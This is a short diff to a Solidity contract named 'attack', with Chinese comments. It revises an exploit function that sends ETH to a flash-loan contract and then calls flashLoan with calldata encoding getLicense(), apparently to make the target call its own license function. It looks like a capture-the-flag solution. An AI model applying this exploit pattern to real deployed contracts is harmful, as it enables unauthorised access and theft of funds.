@@ -11,8 +11,10 @@ contract attack{
         return abi.encodeWithSignature("getLicense()");
     }
     //执行flashCall拿到License
-    function att(address payable _addr,uint256 amount)public{
-        Flashloan(_addr).flashLoan(_addr,amount,getData());
+    function att(address payable _addr)public payable {
+        (bool success,)=_addr.call{value:msg.value}("");
+        require(success);
+        Flashloan(_addr).flashLoan(_addr,0,getData());
     }
     //手调，合约调不行
     function complete(address payable _addr)public{
